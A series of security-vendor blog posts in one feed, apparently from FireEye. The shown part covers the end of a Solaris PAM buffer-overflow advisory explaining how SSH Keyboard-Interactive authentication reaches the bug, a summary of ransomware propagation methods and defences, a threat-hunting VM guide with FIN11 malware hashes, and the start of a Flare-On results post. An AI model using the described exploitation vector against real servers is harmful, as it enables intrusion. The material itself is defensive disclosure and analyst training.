  <span class="type-XS">Figure 1: The parse_user_name function has a
    stack-based buffer overflow vulnerability</span></p>
 <p>The vulnerability arises whenever a username longer than <span
  class="code">PAM_MAX_RESP_SIZE</span> (512 bytes) is passed to <span
  class="code">parse_user_name</span>. The vulnerability has likely
  existed for decades, and one possible reason is that it is only
  exploitable if an application does not already limit usernames to a
  smaller length before passing them to PAM. One situation where
  network-facing software does not always limit the username length
  arises in the SSH server, and this is the exploit vector used by the
  tool that we discovered.</p>
 <p>SSH Keyboard-Interactive authentication is a “passthrough”
  authentication mechanism where the SSH protocol relays prompts and
  responses between the server’s PAM libraries and the client. It was
  designed to support custom forms of authentication such as two-factor
  without modifying the SSH protocol. By manipulating SSH client
  settings to force Keyboard-Interactive authentication to prompt for
  the username rather than sending it through normal means, an attacker
  can also pass unlimited input to the PAM <span
  class="code">parse_user_name</span> function.</p>
 <h4>Proof of Concept Exploit</h4>
 <p>In order to quickly test different versions of Solaris to see if
  they may be vulnerable, we developed a proof of concept exploit to
  trigger the overflow and crash the SSH server. The standard OpenSSH
  client offers all the options needed to trigger the vulnerability
  (Figure 2).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solaris/picture2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: A server can be quickly tested
    to see if it is vulnerable over SSH</span></p>
 <p>The indication that the server is vulnerable is that the SSH client
  prints “Authentication failed;” a non-vulnerable PAM library causes
  the SSH server to repeatedly prompt for a username if it receives one
  that is too long. The overflow in the PAM library also causes the SSH
  server to crash, as shown in Figure 3. The operating system writes a
  crash dump to <span class="code">/core</span> if the SSH server
  crashes with no debugger attached. In fact, if a <span
  class="code">/core</span> file exists on a Solaris machine and the
  file command reports that it is from <span class="code">sshd</span>,
  those are indicators consistent with this vulnerability having been exploited.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/solaris/picture3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: The SSH server crashes in the
    parse_user_name function</span></p>
 <h4>Vulnerable Operating Systems</h4>
 <ul> <li>Solaris 9 (some releases)</li> <li>Solaris 10 (all
  releases)</li> <li>Solaris 11.0<ul> <li>While the <span
        class="code">parse_user_name</span> function remains vulnerable
        in unpatched Solaris 11.1 and later, unrelated changes to the
        PAM library truncate the username before the vulnerable function
        receives it, rendering the issue non-exploitable via SSH. If the
          <span class="code">parse_user_name</span> function were
        reachable in another context, then the vulnerability could
        become exploitable.</li> </ul> </li> <li>Illumos (OpenIndiana
  2020.04)</li> </ul>
 <h4>Mitigations and Workaround</h4>
 <p>A patch from Oracle for Solaris 10 and 11 is described in the <a
    href="https://www.oracle.com/security-alerts/cpuoct2020.html#AppendixSUNS">October
    2020 Critical Patch Update</a>.</p>
 <p>Because Solaris 9 is no longer supported, Oracle has not released a
  patch. For Solaris 9, as well as Solaris 10 or 11 systems where
  patching is inconvenient, we recommend editing the <span
  class="code">/etc/ssh/sshd_config</span> file to add the lines <span
    class="code">ChallengeResponseAuthentication no</span> and <span
    class="code">KbdInteractiveAuthentication no</span> and restart the
  SSH server. While this removes the opportunity to exploit the
  vulnerability using SSH Keyboard-Interactive authentication, there may
  be other ways to attack the <span class="code">parse_user_name</span>
  function and we recommend using this workaround only as a stopgap
  until Solaris 9 systems can be upgraded, or the October patch can be
  accessed and installed for supported Solaris versions.</p>
 <h4>Acknowledgements</h4>
 <p>Jeffrey Martin of Rapid7 contributed to the testing of this vulnerability.</p>
http://www.fireeye.com/blog/threat-research/2020/11/critical-buffer-overflow-vulnerability-in-solaris-can-allow-remote-takeover.html2020-11-04T19:00:00.000Z2020-11-04T18:59:46.009ZRansomware Protection and Containment Strategies: Practical Guidance for
Endpoint Protection, Hardening, and Containmentnoemail@noemail.orgMatthew McWhirt<p>
  <i>UPDATE (Oct. 30, 2020): We have updated the report to include
    additional protection and containment strategies based on front-line
    visibility and response efforts in combating ransomware. While the
    full scope of recommendations included within the initial report
    remain unchanged, the following strategies have been added into the report:</i></p>
 <ul> <li>
    <i>Windows Firewall rule configurations to block specific binaries
      from establishing outbound connections from endpoints</i></li> <li>
    <i>Domain Controller isolation and recovery planning steps</i></li> <li>
    <i>Proactive GPO permissions review and monitoring guidance</i></li> </ul>
 <p>Ransomware is a global threat targeting organizations in all
  industries. The impact of a successful ransomware event can be
  material to an organization - including the loss of access to data,
  systems, and operational outages. The potential downtime, coupled with
  unforeseen expenses for restoration, recovery, and implementation of
  new security processes and controls can be overwhelming. Ransomware
  has become an increasingly popular choice for attackers over the past
  few years, and it’s easy to understand why given how simple it is to
  leverage in campaigns – while offering a healthy financial return for attackers.</p>
 <p>In our latest report, <i>
    <a
      href="/content/dam/fireeye-www/current-threats/pdfs/wp-ransomware-protection-and-containment-strategies.pdf"
      target="_blank">Ransomware Protection and Containment Strategies:
      Practical Guidance for Endpoint Protection, Hardening, and
  Containment</a></i>, we discuss steps organizations can proactively
  take to harden their environment to prevent the downstream impact of a
  ransomware event. These recommendations can also help organizations
  with prioritizing the most important steps required to contain and
  minimize the impact of a ransomware event after it occurs.</p>
 <p>Ransomware is commonly deployed across an environment in two ways:</p>
 <ol> <li>Manual propagation by a threat actor after they’ve penetrated
    an environment and have administrator-level privileges broadly
    across the environment:<ul> <li>Manually run encryptors on targeted
      systems.</li> <li>Deploy encryptors across the environment using
        Windows batch files (mount C$ shares, copy the encryptor, and
        execute it with the Microsoft PsExec tool).</li> <li>Deploy
        encryptors with Microsoft Group Policy Objects (GPOs).</li>
        <li>Deploy encryptors with existing software deployment tools
        utilized by the victim organization.</li> </ul> </li>
    <li>Automated propagation:<ul> <li>Credential or Windows token
        extraction from disk or memory.</li> <li>Trust relationships
        between systems – and leveraging methods such as Windows
        Management Instrumentation (WMI), SMB, or PsExec to bind to
        systems and execute payloads.</li> <li>Unpatched exploitation
        methods (e.g., EternalBlue – addressed via <a
          href="https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010">Microsoft
          Security Bulletin MS17-010</a>).</li> </ul> </li> </ol>
 <p>The report covers several technical recommendations to help
  organizations mitigate the risk of and contain ransomware events including:</p>
 <ul> <li>Endpoint segmentation</li> <li>Hardening against common
    exploitation methods</li> <li>Reducing the exposure of privileged
    and service accounts</li> <li>Cleartext password protections</li> </ul>
 <p>If you are reading this report to aid your organization’s response
  to an existing ransomware event, it is important to understand how the
  ransomware was deployed through the environment and design your
  ransomware response appropriately. This guide should help
  organizations in that process.</p>
 <p>
  <a
    href="/content/dam/fireeye-www/current-threats/pdfs/wp-ransomware-protection-and-containment-strategies.pdf"
    target="_blank">Read the report today</a>.</p>
 <p>*Note: The recommendations in this report will help organizations
  mitigate the risk of and contain ransomware events. However, this
  report does not cover all aspects of a ransomware incident response.
  We do not discuss investigative techniques to identify and remove
  backdoors (ransomware operators often have multiple backdoors into
  victim environments), communicating and negotiating with threat
  actors, or recovering data once a decryptor is provided.</p>
http://www.fireeye.com/blog/threat-research/2019/09/ransomware-protection-and-containment-strategies.html2019-09-05T09:00:00.000Z2020-10-30T17:20:42.289ZWelcome to ThreatPursuit VM: A Threat Intelligence and Hunting Virtual Machinenoemail@noemail.orgDan Kennedy<p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/threatpursuit/logo.png"
    alt="" class="float-right-small" />Skilled adversaries can deceive
  detection and often employ new measures in their tradecraft. Keeping a
  stringent focus on the lifecycle and evolution of adversaries allows
  analysts to devise new detection mechanisms and response processes.
  Access to the appropriate tooling and resources is critical to
  discover these threats within a timely and accurate manner. Therefore,
  we are actively compiling the most essential software packages into a
  Windows-based distribution: <a
    href="https://github.com/fireeye/ThreatPursuit-VM">ThreatPursuit VM</a>.</p>
 <p>ThreatPursuit Virtual Machine (VM) is a fully customizable,
  open-sourced Windows-based distribution focused on threat intelligence
  analysis and hunting designed for intel and malware analysts as well
  as threat hunters to get up and running quickly. The threat
  intelligence analyst role is a subset and specialized member of the
  blue team. Individuals in this role generally have a strong impetus
  for knowing the threat environment. Often their traits, skills and
  experiences will vary depending on training and subject matter expertise.</p>
 <p>Their expertise may not be technical and may include experiences and
  tradecraft earned by operating within a different domain (e.g.,
  geospatial, criminal, signals intelligence, etc.). A key aspect of the
  role may include the requirement to hunt, study and triage previously
  undiscovered or recently emerging threats by discerning data for evil.
  Threat analysts apply a variety of structured analytical methods in
  order to develop meaningful and relevant products for their customers.</p>
 <p>With this distribution we aim to enable users to:</p>
 <ul> <li>Conduct hunting activities or missions</li> <li>Create
    adversarial playbooks using evidence-based knowledge</li>
    <li>Develop and apply a range of analytical products amongst
  datasets</li> <li>Perform analytical pivoting across forensic
    artifacts and elements</li> <li>Emulate advanced offensive security
  tradecraft</li> <li>Enable situational awareness through intelligence
    sharing and reporting</li> <li>Applied data science techniques &amp;
    visualize clusters of symbolic data</li> <li>Leverage open
    intelligence sources to provide unique insights for defense and
  offense</li> </ul>
 <p>Akin to both <a
  href="https://www.fireeye.com/blog/threat-research/2018/11/flare-vm-update.html">FLARE-VM</a>
  and <a
    href="https://www.fireeye.com/blog/threat-research/2019/03/commando-vm-windows-offensive-distribution.html">Commando
  VM</a>, ThreatPursuit VM uses <a
  href="https://boxstarter.org/">Boxstarter</a>, <a
  href="https://chocolatey.org/">Chocolatey</a> and <a
  href="https://www.myget.org/">MyGet</a> packages to install software
  that facilitates the many aspects related to roles performed by
  analysts. The tools installed provide easy access to a broad range of
  tooling, including, but not limited to, threat analytics, statistics,
  visualisation, threat hunting, malware triage, adversarial emulation,
  and threat modelling. Here are some of the tools, but there are many more:</p>
 <ul> <li>
    <a href="https://www.misp-project.org/">MISP</a></li> <li>
    <a href="https://www.opencti.io/en/">OpenCTI</a></li> <li>
    <a href="https://www.elastic.co/">Elasticsearch, Kibana,
  Logstash</a></li> <li>
    <a href="https://www.splunk.com/">Splunk</a></li> <li>
    <a href="https://threathunterplaybook.com/introduction.html">Threat
      Hunter Playbook</a></li> <li>
    <a href="https://www.constellation-app.com/">CSIRO Data61
  Constellation</a></li> <li>
    <a href="https://www.maltego.com/">Maltego</a></li> <li>
    <a href="https://rstudio.com/">RStudio</a></li> <li>
    <a href="https://github.com/mitre/caldera">MITRE CALDERA</a></li> <li>
    <a href="https://jupyter.org/">Jupyter Notebook</a></li> <li>
    <a href="https://www.python.org/">Python</a></li> <li>
    <a href="https://github.com/fireeye/SilkETW">SilkETW</a></li> </ul>
 <p>For a full list of tools, please visit our <a
    href="https://github.com/fireeye/ThreatPursuit-VM">GitHub repository</a>.</p>
 <h4>Installation</h4>
 <p>Similar to <a
  href="https://github.com/fireeye/flare-vm">FLARE-VM</a> and <a
    href="https://github.com/fireeye/commando-vm">Commando VM</a>, it's
  recommended to install ThreatPursuit VM in a virtual machine. The
  following is an overview of the minimal and recommended installation requirements.</p>
 <h5>Requirements</h5>
 <ul> <li>Windows 10 1903 or greater</li> <li>60 GB Hard Drive</li>
    <li>4 GB RAM<br /> </li> </ul>
 <h5>Recommended</h5>
 <ul> <li>Windows 10 1903</li> <li>80+ GB Hard Drive</li> <li>6+ GB
  RAM</li> <li>1 network adapter</li> <li>OpenGL Graphics Card
  1024mb</li> <li>Enable Virtualization support for VM<ul> <li>Required
        for Docker (MISP, OpenCTI)</li> </ul> </li> </ul>
 <h5>Standard Install</h5>
 <p>The easiest way to install ThreatPursuit VM is to use the following
  steps. This will install all the default tools and get you finding
  evil in no time!<br /> </p>
 <ol> <li>Create and configure a new Windows 10 VM with the
    aforementioned requirements.<ul> <li>Ensure VM is updated
        completely. You may need to check for updates, reboot and check
        again until no more remain.</li> </ul> </li> <li>Install your
    specific VM guest tools (e.g., VMware Tools) to allow additional
    features such as copy/paste and screen resizing.</li> <li>Take a
    snapshot of your machine! This allows you to always have a clean
  state.</li> <li>Download and copy <i>
      <a
    href="https://raw.githubusercontent.com/fireeye/ThreatPursuit-VM/install.ps1">install.ps1</a></i>
    to your newly configured VM.</li> <li>Open PowerShell as an
  administrator.</li> </ol>
 <p>Next, unblock the install file by running: <i>Unblock-File
  .\install.ps1</i>, as seen in Figure 1.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/threatpursuit/picture1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Unblock-File installation script</span></p>
 <p>Enable script execution by running: <i>Set-ExecutionPolicy
    Unrestricted -f </i>, as seen in Figure 2.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/threatpursuit/picture2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: Set-ExecutionPolicy
    Unrestricted -f script</span></p>
 <p>Finally, execute the installer script as follows: <i>.\install.ps1</i></p>
 <p>After executing <i>install.ps1</i>, you’ll be prompted for the
  administrator password in order to automate host restarts during
  installation as several reboots occur. Optionally, you may pass your
  password as a command-line argument via &quot;<i>.\install.ps1
    -password &lt;password&gt;&quot;</i>. If you do not have a password
  set, hitting enter when prompted will also work.</p>
 <p>This will be the last thing you will need to do before the
  installation is unattended. The script will set up the Boxstarter
  environment and proceed to download and install the ThreatPursuit VM
  environment, as seen in Figure 3.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/threatpursuit/picture3.png" alt="" />
  <br /> <span class="type-XS">Figure 3: Installation script execution</span></p>
 <p>The installation process may take upwards of several hours depending
  on your internet connection speed and the web servers hosting the
  various files. Figure 4 shows the post-installation desktop
  environment, featuring the logo and a desktop shortcut. You will know
  when the install is finished with the VM's logo placed on the background. </p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/threatpursuit/picture4.png" alt="" />
  <br /> <span class="type-XS">Figure 4: ThreatPursuit VM desktop installed</span></p>
 <h5>Custom Install</h5>
 <p>Is the standard installation too much for you? We provide a custom
  installation method that allows you to choose which chocolatey
  packages get installed. For additional details, see the <a
    href="https://github.com/fireeye/ThreatPursuit-VM#custom-install">Custom
  Install</a> steps at our GitHub repository.</p>
 <h5>Installing Additional Packages</h5>
 <p>Since ThreatPursuit VM uses the Chocolatey Windows package manager,
  it's easy to install additional packages not included by default. For
  example, entering the command <i>cinst github</i> as administrator
  installs GitHub Desktop on your system.</p>
 <p>To update all currently installed packages to their most recent
  versions, run the command <i>cup all</i> as administrator.</p>
 <h4>Getting Started: A Use Case</h4>
 <p>As threat analysts, what we choose to pursue will depend on the
  priorities and requirements of our current role. Often, they vary with
  each threat or adversary encountered such as financial crime,
  espionage, issue-motivated groups or individuals. The role broadly
  encompasses the collection and analysis of threat data (e.g., malware,
  indicators of attack/compromise) with the goal of triaging the data
  and developing actionable intelligence. For example, one may want to
  produce detection signatures based on malware network communications
  to classify, share or disseminate indicators of compromise (IOCs) in
  standardized ways. We may also use these IOCs in order to develop and
  apply analytical products that establish clusters of analogous nodes
  such as MITRE ATT&amp;CK tactics and techniques, or APT groups. On the
  other hand, our goal can be as simple as triaging a malware sample
  behavior, hunting for indicators, or proving or disproving a
  hypothesis. Let's look at how we might start.</p>
 <h4>Open Hunting</h4>
 <p>To start our use case, let’s say we are interested in reviewing
  latest threat actor activity reported for the quarter. We sign in to
    the <a
    href="https://www.fireeye.com/mandiant/advantage.html">Mandiant
  Advantage</a> portal (Figure 5) using our public subscription to get a
  snapshot view of any highlighted activity (Figure 6).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/threatpursuit/picture5.png" alt="" />
  <br /> <span class="type-XS">Figure 5: Mandiant Advantage portal</span></p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/threatpursuit/picture6.png" alt="" />
  <br /> <span class="type-XS">Figure 6: Actor activity for Q3 2020</span></p>
 <p>Based on Mandiant Advantage report, we notice a number of highly
  active APT and FIN actors. We choose to drill in to one of these
  actors by hovering our mouse and selecting the actor tag FIN11.</p>
 <p>We receive a high-level snapshot summary view of the threat actor,
  their targeted industry verticals, associated reports and much more,
  as seen in Figure 7. We also may choose to select the most recent
  report associated with <a
  href="https://advantage.mandiant.com/reports/20-00011864">FIN11</a> for review.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/threatpursuit/picture7.png" alt="" />
  <br /> <span class="type-XS">Figure 7: FIN11 actor summary</span></p>
 <p>By selecting the “View Full Page” button as seen at the top right
  corner of Figure 6, we can use the feature to download indicators, as
  seen in the top right corner of Figure 8.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/threatpursuit/picture9.png" alt="" />
  <br /> <span class="type-XS">Figure 8: Full FIN11 page</span></p>
 <p>Within the FIN11 report, we review the associated threat
  intelligence tags that contain finished intelligence products.
  However, we are interested in the collection of raw IOCs (Figure 9)
  that we could leverage to pivot off or enrich our own datasets.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/threatpursuit/picture10.png" alt="" />
  <br /> <span class="type-XS">Figure 9: Downloaded FIN11 indicators</span></p>
 <p>Using the <a href="https://www.misp-project.org/">Malware
    Information Sharing Platform (MISP</a>)as our collection point, we
  are going to upload and triage our indicators using our local MISP
  instance running on ThreatPursuit VM.</p>
 <p>Please note you will need to ensure your local MISP instance is
  running correctly with the configuration of your choosing. We select
  the “Add Event” button, begin populating all needed fields to prepare
  our import, and then click “Submit”, as shown in Figure 10.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/threatpursuit/picture11.png" alt="" />
  <br /> <span class="type-XS">Figure 10: MISP triage of events</span></p>
 <p>Under the tags section of our newly created FIN11 event, we apply
  relevant tags to begin associating aspects of contextual information
  related to our target, as seen in Figure 11.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/threatpursuit/picture12.png" alt="" />
  <br /> <span class="type-XS">Figure 11: MISP Event setup for FIN11</span></p>
 <p>We then select “Add Attribute” into our event, which will allow us
  to import our MD5 hashes into the MISP galaxy, as seen in Figure 12.
  Using both the category and type, we select the appropriate values
  that best represent our dataset and prepare to submit that data into
  our event.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/threatpursuit/picture13.png" alt="" />
  <br /> <span class="type-XS">Figure 12: MISP import events into FIN11 event</span></p>
 <p>MISP allows for a streamlined way to drill and tag indicators as
  well as enrich and pivot with threat intelligence. We can also choose
  to perform this enrichment process within MISP using a variety of open
  intelligence sources and their modules, such as <a
    href="https://www.fireeye.com/mandiant/advantage.html">Mandiant
  Advantage</a>, <a href="http://passivetotal.com/">PassiveTotal</a>,
  Shodan and <a href="https://www.virustotal.com/">VirusTotal</a>. We
  can also achieve the same result using similar tools already packaged
  in ThreatPursuit VM.</p>
 <p>Using Maltego CE, installed as part of the VM, we can automate
  aspects of targeted collection and analysis of our FIN11 malware
  families and associated infrastructure. The following are just some of
  the Maltego plugins that can be configured post installation to help
  with the enrichment and collection process:</p>
 <ul> <li>
    <a
      href="https://developers.virustotal.com/v3.0/reference">VirusTotal
      Public API</a></li> <li>
    <a
  href="https://github.com/AlienVault-OTX/ApiV2">ThreatCrowd</a></li> <li>
    <a href="https://developer.shodan.io/api">Shodan API</a></li> </ul>
 <p>Targeting the suspected payload, we attempt to pivot using its MD5
  hash value (113dd1e3caa47b5a6438069b15127707) to discover additional
  artifacts, such as infrastructure, domain record history, previously
  triaged reports, similar malware samples, timestamps, and the rich headers.</p>
 <p>Importing our hash into Maltego CE, we can proceed to perform a
  range of queries to hunt and retrieve interesting information related
  to our FIN11 malware, as seen in Figure 13.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/threatpursuit/figure15a.png" alt="" />
  <br /> <span class="type-XS">Figure 13: Maltego CE querying MD5 hash</span></p>
 <p>Quite quickly we pull back indicators; in this case, generic named
  detection signatures from a range of anti-malware vendors. Using
  VirusTotalAPI Public, we perform a series of collection and triage
  queries across a variety of configured open sources, as shown in
  Figure 14.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/threatpursuit/picture16.png" alt="" />
  <br /> <span class="type-XS">Figure 14: Automating enrichment and
    analysis of targeted infrastructure</span></p>
 <p>A <a
    href="https://www.virustotal.com/graph/embed/ga379f635a7fc4ea283b95be43fe12ad71c83f82543044735a883e21e8a16296e">visual
    link has been made public</a> for quick reference.  </p>
 <p>With our newly identified information obtained by passively scraping
  those IOCs from a variety of data providers, we can identify
  additional hashes, delivery URLs and web command and control
  locations, as shown in Figure 15.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/threatpursuit/picture17.png" alt="" />
  <br /> <span class="type-XS">Figure 15: Maltego visualization of FIN11 dropper</span></p>
 <p>Pivoting on the suspected FIN11 delivery domain near-fast[.]com, we
  have found several more samples that were uploaded to an online
  malware sandbox website <a href="https://app.any.run/">AppAnyRun</a>.
  Within the ThreatPursuit VM Google Chrome browser and in the Tools
  directory, there are shortcuts and bookmarks to a range of sandboxes
  to help with accessing and searching them quickly. We can use <a
  href="https://app.any.run/">AppAnyRun</a> to further analyze the
  heterogenous networks and execution behaviors of these acquired samples.</p>
 <p>We have identified another similar sample, which is an XLS document
  named “MONITIORING REPORT.xls” with the MD5 hash
  5d7d2371668ad4a6484f76b0b6511961 (Figure 16). Let’s attempt to triage
  this newly discovered sample and qualify the relationship back to FIN11.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/threatpursuit/figure19b.png" alt="" />
  <span class="type-XS">
    <br /> Figure 16: VirusTotal execution report of 5d7d2371668ad4a6484f76b0b6511961</span></p>
 <p>Extracting interesting strings and indicators from this sample
  allows us to compare these artifacts against our own dynamic analysis.
  If we can’t access the original malware sample, but we have other
  indicators to hunt with, we could also pivot on various unique
  characteristics and attributes (e.g., imphash, vthash, pdb string,
  etc...) to discover related samples.</p>
 <p>Even without access to the sample, we can also use YARA to mine for
  similar malware samples. One such source to mine is using the <a
  href="http://mquery.net/">mquery</a> tool and their datasets offered
  via CERT.PL. To fast track the creation of a YARA rule, we leverage
  the FIN11 YARA rule provided within the <a
    href="https://advantage.mandiant.com/reports/20-00011864">FIN11
    Mandiant Advantage report</a>. Simply copy and paste the YARA rule
  into mquery page and select “Query” to perform the search (Figure 17).
  It may take some time, so be sure to check back later (here are the <a href="http://mquery.net/query/4SVL0NIHJH6B">results</a>).</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/threatpursuit/picture20.png" alt="" />
  <br /> <span class="type-XS">Figure 17: mquery YARA rule hunting
    search for FIN11 malware</span></p>
 <p>Within our mquery search, we find a generic signature hit on
  Win32_Spoonbeard_1_beta for the MD5 hash
  3c43d080b5badfdde7aff732c066d1b2. We associate this MD5 hash with
  another sandbox, app.any.run, at the following URL:</p>
 <ul>
  <li>https://app.any.run/tasks/19ac204b-9381-4127-a5ac-d6b68e0ee92c/</li> </ul>
 <p>As seen in Figure 18, this sample was first uploaded on May 2, 2019,
  with an associated infection chain intact.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/threatpursuit/picture21.png" alt="" /></p>
 <p>
  <span class="type-XS">Figure 18: AppAnyRun Execution Report on 3c43d080b5badfdde7aff732c066d1b2</span></p>
 <p>We now have a confident signature hit, but with different named
  detections on the malware family. This is a common challenge for
  threat analysts and researchers. However we have gained interesting
  information about the malware itself such as its execution behavior,
  encryption methods, dropped files, timelines and command and control
  server and beacon information. This is more than enough for us to
  pivot across our own datasets to hunt for previously seen activities
  and prepare to finalize our report.</p>
 <p>Once we are confident in our analysis, we can start to model and
  attribute the malware characteristics. We can leverage other threat
  exchange communities and intelligence sources to further enrich the
  information we collected on the sample. Enrichment allows the analysts
  to greater extrapolate context such as timings, malware similarity,
  associated infrastructures, and prior targeting information. We will
  briefly add our content into our MISP instance and apply tags to
  finalize our review.</p>
 <p>We may wish to add MITRE ATT&amp;CK tags (Figure 19) relevant across
  the malware infection chain for our sample as they could be useful
  from a modelling standpoint.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/threatpursuit/picture22.png" alt="" />
  <br /> <span class="type-XS">Figure 19: MITRE ATT&amp;CK tags for the
    malware sample</span></p>
 <h4>Final Thoughts</h4>
 <p>We hope you enjoyed this basic malware triage workflow use-case
  using ThreatPursuit VM. There are so many more tools and capabilities
  within the included toolset such as Machine learning (ML) and ML
  algorithms, that also assist threat hunters by analyzing large volumes
  of data quickly. Check out some of FireEye’s ML blog posts here.</p>
 <p>For a complete list of tools please see the <a
    href="https://github.com/fireeye/ThreatPursuit-VM">ThreatPursuit VM
    GitHub repository</a>. We look forward to releasing more blog posts,
  content and playbooks as our user base grows.</p>
 <p>And finally, here are some related articles that might be of interest.</p>
 <h4>Malware Analysis</h4>
 <ul> <li>
    <a
      href="/content/fireeye-www/en_US/blog/threat-research/2019/09/open-sourcing-stringsifter.html">Open
      Sourcing StringSifter</a><u></u></li> <li>
    <a
      href="/content/fireeye-www/en_US/blog/threat-research/2020/07/capa-automatically-identify-malware-capabilities.html">capa:
      Automatically Identify Malware Capabilities</a><u></u></li> <li>
    <a
      href="/content/fireeye-www/en_US/blog/threat-research/2019/05/learning-to-rank-strings-output-for-speedier-malware-analysis.html">Learning
      to Rank Strings Output for Speedier Malware
  Analysis</a><u></u></li> <li>
    <a
      href="/content/fireeye-www/en_US/blog/threat-research/2020/05/analyzing-dark-crystal-rat-backdoor.html">Analyzing
      Dark Crystal RAT, a C# Backdoor</a><u></u></li> <li>
    <a
      href="/content/fireeye-www/en_US/blog/threat-research/2020/05/tactics-techniques-procedures-associated-with-maze-ransomware-incidents.html">Navigating
      the Maze: Tactics, Techniques and Procedures Associated With MAZE
      Ransomware Incidents</a><u></u></li> </ul>
 <h4>Digital Forensics</h4>
 <ul> <li>
    <a
      href="/content/fireeye-www/en_US/blog/threat-research/2020/05/using-real-time-events-in-investigations.html">Using
      Real-Time Events in Investigations</a></li> <li>
    <a
      href="/content/fireeye-www/en_US/blog/threat-research/2020/09/dfur-ent-perspective-on-threat-modeling-and-application-log-forensic-analysis.html">A
      &quot;DFUR-ent&quot; Perspective on Threat Modeling and
      Application Log Forensic Analysis</a></li> <li>
    <a
      href="/content/fireeye-www/en_US/blog/threat-research/2020/07/scandalous-external-detection-using-network-scan-data-and-automation.html">SCANdalous!
      (External Detection Using Network Scan Data and
  Automation)</a></li> </ul>
 <h4>Intelligence Analysis and Assessments</h4>
 <ul> <li>
    <a
      href="/content/fireeye-www/en_US/blog/threat-research/2020/02/managed-defense-the-analytical-mindset.html">Managed
      Defense: The Analytical Mindset</a></li> <li>
    <a
      href="/content/fireeye-www/en_US/blog/executive-perspective/2020/08/strategic-intelligence-helps-organizations-make-sense-of-threat-landscape.html">How
      Strategic Intelligence Helps Organizations Make Sense of the
      Threat Landscape</a></li> <li>
    <a
      href="/content/fireeye-www/en_US/blog/threat-research/2020/04/limited-shifts-in-cyber-threat-landscape-driven-by-covid-19.html">Limited
      Shifts in the Cyber Threat Landscape Driven by COVID-19</a></li> <li>
    <a
      href="/content/fireeye-www/en_US/blog/threat-research/2020/03/they-come-in-the-night-ransomware-deployment-trends.html">They
      Come in the Night: Ransomware Deployment Trends</a></li> </ul>
http://www.fireeye.com/blog/threat-research/2020/10/threatpursuit-vm-threat-intelligence-and-hunting-virtual-machine.html2020-10-28T15:30:00.000Z2020-10-28T15:34:35.622ZFlare-On 7 Challenge Solutionsnoemail@noemail.orgNick Harbour<p>We are thrilled to announce the conclusion of the seventh annual
  Flare-On challenge. This year proved to be the most difficult
  challenge we’ve produced, with the lowest rate of finishers. This
  year’s winners are truly the elite of the elite! Lucky for them, all
  260 winners will receive this cyberpunk metal key.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/flareon7-solutions/picture1.png" alt="" /></p>
 <p>We would like to thank the challenge authors individually for their
  great puzzles and solutions:</p>
 <ol> <li>fidler – Nick Harbour (<a
  href="https://twitter.com/nickharbour">@nickharbour</a>)</li>
    <li>garbage – Jon Erickson</li> <li>Wednesday – Blaine Stancill (<a
  href="https://twitter.com/MalwareMechanic">@MalwareMechanic</a>)</li>
    <li>report – Moritz Raabe (<a
  href="https://twitter.com/m_r_tz">@m_r_tz</a>)</li> <li>TKApp – Moritz
    Raabe (<a href="https://twitter.com/m_r_tz">@m_r_tz</a>)</li>
    <li>CodeIt – Mike Hunhoff (<a
  href="https://twitter.com/mehunhoff">@mehunhoff</a>)</li> <li>re_crowd
    – Chris Gardner, Moritz Raabe, Blaine Stancill</li> <li>Aardvark –
    Jacob Thompson</li> <li>crackinstaller – Paul Tarter (<a
  href="https://twitter.com/HefrPidge">@Hefrpidge</a>)</li> <li>break –
    Chris Gardner</li> <li>Rabbit Hole – Sandor Nemes (<a
  href="https://twitter.com/sandornemes">@sandornemes</a>)</li> </ol>
 <p>This year’s Flare-On challenge was the first to feature a live
  public scoreboard, so players could track their progress and the
  progress of previous Flare-On challenge champions. Despite this
  increased data at your fingertips, we are still going to bring you
  even more stats. As of 11:00am ET, participation was near record
  setting levels at 5,648 players registered. 3,574 of those players
  finished at least one challenge.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/flareon7-solutions/picture2.png" alt="" /></p>
 <p>The U.S. reclaimed the top spot for total finishers with 22.
  Singapore was once again in second place, but in uncontested first
  place per capita, with one Flare-On finisher for every 296,000 living
  persons in Singapore. This is the first year we have included a per
  capita finishers by country chart, and we did it to highlight just
  what a remarkable concentration of talent exists in some corners of
  the world. Consistent top finisher Russia took third place, and a
  growing player base in Germany and Israel came into full bloom this
  year, with those countries edging out other frequent top five
  countries such as China, India and Vietnam.</p>
 <p>
  <img
